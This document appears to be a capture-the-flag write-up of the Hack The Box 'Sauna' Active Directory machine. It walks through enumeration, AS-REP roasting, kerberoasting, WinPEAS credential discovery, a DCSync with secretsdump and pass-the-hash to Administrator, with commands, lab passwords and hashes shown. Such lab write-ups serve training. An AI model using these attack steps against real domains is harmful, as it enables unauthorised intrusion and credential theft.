
# Reconnaissance

## Attack Surface

Starting with an nmap scan - terrible opsec in this one, scanning all ports for versions and scripts:
```
rota@rota-mint:~/labs.htb/sauna$ nmap -p- --min-rate 5000 -sV -sC 10.129.95.180                                                                            

PORT      STATE SERVICE       VERSION                                                                                                                                    
53/tcp    open  domain        Simple DNS Plus                                                                                                                            
80/tcp    open  http          Microsoft IIS httpd 10.0
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-12 10:45:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-12T10:46:34
|_  start_date: N/A
|_clock-skew: 1d23h28m58s

```

Based on this output, the first thing I notice is the domain name listed by LDAP: `EGOTISTICAL-BANK.LOCAL` and the Hostname: `SAUNA`. Kerberos, LDAP, SMB, and RPC confirm the existence of Active Directory, so I'll be keeping an eye out for any other domain machines and services that might provide another attack surface. I'll also note there's a clock skew which will require ntp modification to attempt any kerberos based attacks down the line. There is also an IIS webserver on port 80 that could contain vulnerabilities and misconfigurations to aid in domain compromise.

Another very lucrative open target is winrm (port 5985), although to access this I'll need valid credentials. 

I'll add the the domain name returned by nmap to my hosts file and continue from there.

My plan thus far is to start with DNS - looking for any additional attack surfaces.
Then move on to SMB - aiming to identify any low hanging fruit such as share access or user/group identification.
After that, I'll target LDAP to enumerate domain objects.
If I still haven't found anything by useful by then, I'll be enumerating RPC before moving on to the webserver, which is often the largest attack surface.

## Service Enumeration
----
### DNS

Given the limited information I have about the domain at this stage, I'll query the domain name against the target's resolver:
```
rota@rota-mint:~/labs.htb/sauna$ dig @10.129.95.180 egotistical-bank.local

;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;egotistical-bank.local.                IN      A

;; ANSWER SECTION:
egotistical-bank.local. 600     IN      A       10.10.10.175

```

This returns a different ip address, though that may just be due to the structure of HTB's lab environments as opposed to being a new attack vector. I'll keep note of it here for now.

Zone transfer returns failed, so I'll move on to SMB and revisit this service later for more indepth enumeration if I get stuck.

----
### SMB

When enumerating SMB my first test is always a null auth through NetExec, followed by a Guest auth attempt in case of the `Guest` account having higher privileges than the null auth. I'll also want to pay attention to the banners as they tell a short story about what may be possible through the service.

```bash
rota@rota-mint:~/labs.htb/sauna$ nxc smb 10.129.95.180 -u '' -p ''

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
```

```
rota@rota-mint:~/labs.htb/sauna$ nxc smb 10.129.95.180 -u 'Guest' -p ''

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Guest: STATUS_ACCOUNT_DISABLED 
```

In this case I can see null auth is enabled in both the banner and from the output, however, the `Guest` account is disabled.
I also see that signing is true and SMBv1 is disabled, which rules out a few attacks, but overall isn't very helpful for me.

I'll also test a non-existing user, as sometimes that syntax is authorised as the guest account too.

```
rota@rota-mint:~/labs.htb/sauna$ nxc smb 10.129.95.180 -u 'false' -p ''

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\false: STATUS_LOGON_FAILURE
```

Unfortunately, that's not true here.

With the null auth successful, I'll check to see if I have access to any shares or any user/group listings
```
rota@rota-mint:~/labs.htb/sauna$ nxc smb 10.129.95.180 -u '' -p '' --shares

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.129.95.180   445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

I get an access denied for the shares, while the users flag returns nothing.

It may also be worth trying rid-brute to either confirm lack of permissions or retrieve 

```
rota@rota-mint:~/labs.htb/sauna$ nxc smb 10.129.95.180 -u '' -p '' --rid-brute

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.129.95.180   445    SAUNA            [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

This also returns an access denied.
At this point, I think it's time to check out LDAP.

---
### LDAP


The early stages of my LDAP enumeration are very similar to SMB.
I'll confirm/deny null auth and/or guest auth, then attempt to use queries to uncover any lucrative information. Also like SMB, the banners will be important here due to circumstantial attack opportunities.

```
rota@rota-mint:~/labs.htb/sauna$ nxc ldap 10.129.95.180 -u '' -p ''

LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
```

```
rota@rota-mint:~/labs.htb/sauna$ nxc ldap 10.129.95.180 -u 'Guest' -p ''

LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.180   389    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Guest: STATUS_ACCOUNT_DISABLED
```

Once again, I have null auth and the `Guest` account is disabled. I also notice that no digital signature is required and TLS binding isn't required. This could be an opportunity for a relay attack later on.

For now I'll attempt to continue with enumerating users or groups.

Users returns no information, but not access denied.
Groups returns the same.
Occasionally, no information IS information, although I'm not sure that's the case here.

I'll explore what query information (if any) I can uncover from here.

This command:
`nxc ldap -u '' -p '' --query "(objectClass=*)" ""`
returned a large section of information. To refine this slightly I'll look through it for an identifiable attribute relative to my goals here and retry the query.

After reviewing the output, I notice it's only the output for the domain object.
It appears to be information that would also be visible from a tool like bloodhound.
```
<snip>
LDAP        10.129.95.180   389    SAUNA            [+] Response for object: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
LDAP        10.129.95.180   389    SAUNA            [+] Response for object: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
LDAP        10.129.95.180   389    SAUNA            [+] Response for object: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
LDAP        10.129.95.180   389    SAUNA            [+] Response for object: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
LDAP        10.129.95.180   389    SAUNA            [+] Response for object: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
LDAP        10.129.95.180   389    SAUNA            [+] Response for object: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCALx
```

The part that sticks out most is the existence of `Hugo Smith` which is likely a user account of some kind.

I'm thinking from here it's time to get into the web server. Before that I'll quickly go through RPC and attempt a few simple checks such as enumdomusers and enumdomgroups.

---
### RPC

Checking for null auth, I get access to the client
```
rota@rota-mint:~/labs.htb/sauna$ rpcclient -N -U "" 10.129.95.180
rpcclient $> 
```

And straight away from here I'll try some quick enumeration queries
```
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
```
No luck there.

At this stage I'm more interested in attempting to recover information from the web server. There is more enumeration to be done here, however, without SAMR capabilities my options are limited.

---

### HTTP

This is usually the largest attack surface, so correct mapping and testing is important.

My first goal here will be to identify the technologies and functions of the service, alongside documenting the version numbers for future CVE research and common misconfigurations.

To begin identifying the stack, I know it's a Windows host running an IIS 10.0 webserver from the nmap scan earlier so I'll add that to the list.


```techstack
OS: Windows
WebServer: IIS 10.0
DataBase: 
Language: 
```

Whatweb might help uncover some of these technologies:
```
rota@rota-mint:~/labs.htb/sauna$ whatweb 10.129.95.180

http://10.129.95.180 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.95.180], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
```

Turns out it doesn't.

Time to get into the browser to try identify the endpoints, input fields, and remaining technologies.
While looking through the browser manually, I'll also run a gobuster scan for any directories followed by a subdomain scan with ffuf.

Before testing any of the functionalities and exploring too much, I'll check the homepage source for any leaked secrets.

Nothing of immediate interest.

The gobuster scan finished, revealing nothing interesting either.
Time to get the subdomain scan going too.
This also returns nothing of interest.

I'll start exploring the site's content and functionalities to begin identifying potential attack vectors.

The `Home` page contains a link to `single.html` and a newsletter subscription field followed by a list of their clients in a testimonial section, although the names are listed as `Client1 ` through to `Client 6`.

The `About Us` page contains the same content, however, every link returns to `about.html#` and instead of a client list it has a `Meet The Team` section. This details the names of the team as follows:
```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```
This could prove useful in the future as a potential user list if I can identify the naming scheme used by user accounts. The standard is usually either `First.Last`, `F.last`, or `FLast`(First initial followed by Last name) so for now I'll create a user list under that assumption (I'm also adding all upper case and all lowercase equivalent entries for good coverage).

The `Single Page` page contains a search field which when provided input, returns a 405 error at the url `single.html#`. This leads me to believe it doesn't accept POST requests.
```
405 - HTTP verb used to access this page is not allowed.
The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.
```

It also contains a comment section, which when attempting to post a comment, returns the same error. This furthers my assumption into the territory that the entire website may not accept POST requests. If that's the case, searching for web injection vulnerabilities will be a complete waste of time. 

The `Team` page redirects to the about.html from `About Us`.

The last page in Navigation is the `Contact Us` page, which contains a contact form. This will be good for loosely concluding my hypothesis about POST requests earlier. After entering placeholder details, I am met with the exact same error. So for now I'll assume that POST requests are ineffective or maybe just entirely don't work.

With no discoverable login forms or functional input fields, no uncovered directories or subdomains, I'll take the list of potential users I obtained from `About Us` and test some unauthenticated attacks before proceeding with more in depth enumeration.

---
## Unauthenticated Exploitation

With not much more than the names of some employees obtained, I can attempt a few different attacks using the user list and guessing common account structures. Being an AD domain, the first (and quickest) technique I'll attempt is AS-REP roasting, then I'll attempt some targeted user enumeration and password policy or structure identification, followed by a brute-forcing attempt.

For reference, the user list is formatted for each user like this currently:
```
Fergus.Smith                                                                                                                                                             
fergus.smith                                                                                                                                                             
FERGUS.SMITH                                                                                                                                                             
F.Smith                                                                                                                                                                  
f.smith                                                                                                                                                                  
F.SMITH                                                                                                                                                                  
FSmith                                                                                                                                                                   
fsmith                                                                                                                                                                   
FSMITH                                                                                                                                                                   
                                                                                                                                                                         
Shaun.Coins                                                                                                                                                              
shaun.coins                                                                                                                                                              
SHAUN.COINS                                                                                                                                                              
S.Coins
s.coins
S.COINS
SCoins
scoins
SCOINS
<snip>
```
(There is definitely an easier way to generate a wordlist for this purpose, which I'll research after the box. For now all I know is that it took far longer than an automation would've. Thinking about it now I could've used a looping script to generate it... I'll revisit this seperately.)

---
### AS-REP Roast

To attempt this attack, I can use impacket's `GetNPUsers.py` tool, passing my created wordlist and the domain name through it.

It seems 3 entries for capitalisation was a bit extreme, however this is the relevant output:
```
rota@rota-mint:~/labs.htb/sauna$ GetNPUsers.py -usersfile users.txt -no-pass egotistical-bank.local/
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                            
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                            
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                            
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                            
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                            
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                            
[-] Kerberos SessionError: KDC_ERR_NEVER_VALID(Requested starttime is later than end time)
<snip>
```

The unique error is indicative of clock skew getting in the way... although it seems like this may work once resolved.

using ntpdate I'll match the targets time and try again
```
rota@rota-mint:~/labs.htb/sauna$ GetNPUsers.py -usersfile users.txt -no-pass egotistical-bank.local/

<snip>
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:a8b27cfa0827cd220116e60816d62f74$c1b6b79afa8c208d563155c07d24c3dafe3a51956e847ff734cf4aacc5410386fb967585e61fe24c9b61872b7a748f5e4f379a71611a41dfd49180333f330c5bb769be7c1692efc9d43af3bcfa0f471227d2d8e4b2f2f670b2bec942d1f67278dc2b07c5263340c63defa5d867
<snip>
```

And there's a hash.

---
### Hash Cracking

I'll add the hash to a file and pass it through hashcat, attempting to recover usable credentials
Important note:
AS-REP mode: `-m 18200`
```
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:5dde72a881c7f090c2e2be39ade40e27$73<snip>
:Thestrokes23
```

And I get a password for FSmith.
`FSmith:Thestrokes23`

My first thought is back to the potential for a relay attack via LDAP.
Before I can move towards that, I'll have to confirm the credentials and access of the `FSmith` user
Using NetExec again, I'll test which services I have access to with these new credentials
```
SMB: Valid
LDAP: Valid
WinRM: Valid
```

From here my ideal order of operations will be a bloodhound collection via LDAP and reattempting queries for any plaintext credentials. Then SMB share access, looking for files that may contain privilege escalation or lateral movement vectors. If no information is recovered that way, I'll manually enumerate the users privileges and access through a shell using `evil-winrm`.

---

## FSmith Enumeration

To begin this enumeration process, I'll attempt to grab a .zip file for bloodhound injestion.

A couple of attempts here failed due to:
- No `--dns-server` flag
- DC not specified
(Great example of why effective notes are important)

The success message returns and the file is now ready to be injested.

I'll initialise bloodhound, injest the file, and take a look for any useful data such as outbound object controls and pathways to high value targets.

FSmith is part of the `REMOTE MANAGEMENT USERS`, which is obviously what grants WinRM access, and also the `DOMAIN USERS` group.

Sometimes `DOMAIN USERS` can allow for kerberoasting under the right circumstances so I'll keep this vector in mind while collecting information.
In order for this to work, I'll either have to do the attack blind or identify a service account with a corresponding SPN.

Checking the shortest path to high value targets reveals nothing particularly interesting.

### LDAP

Next is to gather information via LDAP queries.
Starting with identifying users:
```
rota@rota-mint:~/labs.htb/sauna$ nxc ldap egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --users                                                                   
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            [*] Enumerated 6 domain users: EGOTISTICAL-BANK.LOCAL
LDAP        10.129.95.180   389    SAUNA            -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.95.180   389    SAUNA            Administrator                 2021-07-27 02:16:16 0        Built-in account for administering the computer/domain      
LDAP        10.129.95.180   389    SAUNA            Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.95.180   389    SAUNA            krbtgt                        2020-01-23 15:45:30 0        Key Distribution Center Service Account                     
LDAP        10.129.95.180   389    SAUNA            HSmith                        2020-01-23 15:54:34 0                                                                    
LDAP        10.129.95.180   389    SAUNA            FSmith                        2020-01-24 02:45:19 0                                                                    
LDAP        10.129.95.180   389    SAUNA            svc_loanmgr                   2020-01-25 09:48:31 0  
```

It also appears that there is a service account. This may be a vulnerable target for the aforementioned kerberoast. I'll keep an eye out for any SPN indicators.

With access to ldap queries confirm through the data returned, I'll attempt to query all domain objects again and look for a feature to refine the query with.

Reviewing the output I Identify the object class `user` which should be the most relevant to my enumeration.
This also returns a very large output, so I'll skim through and identify any useful attributes to condense the query with.
Settling on sAMAccountName, servicePrincipalName, and Description, I'll try the query once again.

The most notable of the output is this:
```
rota@rota-mint:~/labs.htb/sauna$ nxc ldap egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --query "(objectClass=user)" "sAMAccountName servicePrincipalName Description"

<snip>
LDAP        10.129.95.180   389    SAUNA            sAMAccountName       HSmith
LDAP        10.129.95.180   389    SAUNA            servicePrincipalName SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111
<snip>
```

Exactly what I need to confirm a kerberoast, so that's the next step here.

---
## Lateral Movement Attempt

I'll use GetUserSPNs.py from impacket to attempt this attack.

```
rota@rota-mint:~/labs.htb/sauna$ GetUserSPNs.py 'egotistical-bank.local/FSmith:Thestrokes23' -request
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 15:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
[-] Principal: egotistical-bank.local\HSmith - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

A clock skew error... but also a kerberoastable target!

ntpdate to the rescue and retry:
```
rota@rota-mint:~/labs.htb/sauna$ GetUserSPNs.py 'egotistical-bank.local/FSmith:Thestrokes23' -request
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 15:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$7bd7d06de5afa084f5bc<snip>
```

And there's the hash.

As always I'll head to hashcat and attempt to crack it
```
rota@rota-mint:~/labs.htb/sauna$ hashcat -m 13100 hash.txt ~/rockyou.txt

$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$7bd7d06de5afa084f5bc<snip>
:Thestrokes23
```

Funnily enough, it's the same password as FSmith.

Keeping in mind enumeration is incomplete with FSmith, I'll complete the same steps with the HSmith user and see if there are any identifiable differences.

---

## HSmith Access

I'll confirm which services HSmith can access and add the user to owned in bloodhound.
```
SMB: Valid
LDAP: Valid
WinRM: Invalid
```

Oddly, FSmith has WinRM access but HSmith doesn't.

Bloodhound displays matching groups as FSmith with the exception of Remote Users.

In continuing enumeration, I'll be checking the access of both users where FSmith lacks privileges.

---

## Authenticated Enumeration (Continued)


### SMB

The next service I'll investigate is SMB.

```
rota@rota-mint:~/labs.htb/sauna$ nxc smb egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --shares

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
SMB         10.129.95.180   445    SAUNA            Share           Permissions            Remark
SMB         10.129.95.180   445    SAUNA            -----           -----------            ------
SMB         10.129.95.180   445    SAUNA            ADMIN$                                 Remote Admin
SMB         10.129.95.180   445    SAUNA            C$                                     Default share
SMB         10.129.95.180   445    SAUNA            IPC$            READ                   Remote IPC
SMB         10.129.95.180   445    SAUNA            NETLOGON        READ                   Logon server share 
SMB         10.129.95.180   445    SAUNA            print$          READ                   Printer Drivers
SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6                        We cant print money
SMB         10.129.95.180   445    SAUNA            SYSVOL          READ                   Logon server share 
```

There's 2 interesting shares here, but only one with read access: `print$`.

What makes these shares interesting is the potential for PrintNightmare (CVE-2021-1675 / CVE-2021-34527). 
I'll keep this in mind for the exploitation phase.

I'm curious what I can enumerate through WinRM...

---
### WinRM

Using evil-winrm I'll explore the privileges, groups, and local files that `FSmith` has access to.
(Here I can also collect the user flag)

Unsurprisingly, bloodhound covered most of the useful information. My next best path (and a time saving one) is to upload a copy of WinPEAS.

Grabbing the system architecture:
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> $env:PROCESSOR_ARCHITECTURE
AMD64
```
I can get the corresponding version of WinPEAS from github then upload that through evil-winrm.

I'll move over to the globally accessible `ProgramData` directory and upload the file.
```
*Evil-WinRM* PS C:\ProgramData> upload winpeas.ps1                                                                                                   
                                                                                                                                                                         
Info: Uploading /home/rota/labs.htb/sauna/winpeas.ps1 to C:\ProgramData\winpeas.ps1                                                                  
                                                                                                                                                                         
Data: 126624 bytes of 126624 bytes copied                                                                                                                                
                                                                                                                                                                         
Info: Upload successful!
```

After running it and reviewing the output, this seems to be the most interesting part:
```
=========|| Additonal Winlogon Credentials Check 
EGOTISTICALBANK                       
EGOTISTICALBANK\svc_loanmanager                                                     
Moneymakestheworldgoround! 
```

It appears to be more credentials!
`svc_loanmanager:Moneymakestheworldgoround!`

(Except these aren't the right credentials. At this point I attempted to authenticate to the 3 main services and was denied for all. This was because - as referenced in the user list - the account username was actually `svc_loanmgr`. Short detour but important lesson: Always validate your information.)

I'll confirm access again:
```
SMB: Valid
LDAP: Valid
WinRM: Valid
```

---

## Elevated Privilege Enumeration


With credentials confirmed and access validated, I'll add `svc_loanmgr` to owned users in bloodhound and investigate for any potential privilege escalation methods. If that fails, I'll connect via evil-winrm and enumerate the users capabilities further.

Bloodhound actually details that `svc_loanmgr` has DCSync privileges for `egotistical-bank.local`. Perfect!

This attack is relatively straight forward thanks to impacket's `secretsdump.py` tool. As a result, I should have all the local hashes returned (including Administrator), effectively resulting in domain compromise. 

---
## Privilege Escalation (DCSync)

Getting right in to it, I'll run secretsdump.py:
```
rota@rota-mint:~/labs.htb/sauna$ secretsdump.py 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!'@SAUNA.egotistical-bank.local
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
<snip>
```

And there's the `Administrator` hash.

To get a shell all I need to do is pass the hash through `evil-winrm`, however for the sake of curiosity I'm going to see if it cracks.

Hashcat returns bad news:
```
rota@rota-mint:~/labs.htb/sauna$ hashcat -m 1000 ntlm ~/rockyou.txt

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)

```

Doesn't seem like the password exists in rockyou, although I should still be able to authenticate with the hash itself.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```

And that's domain compromise!
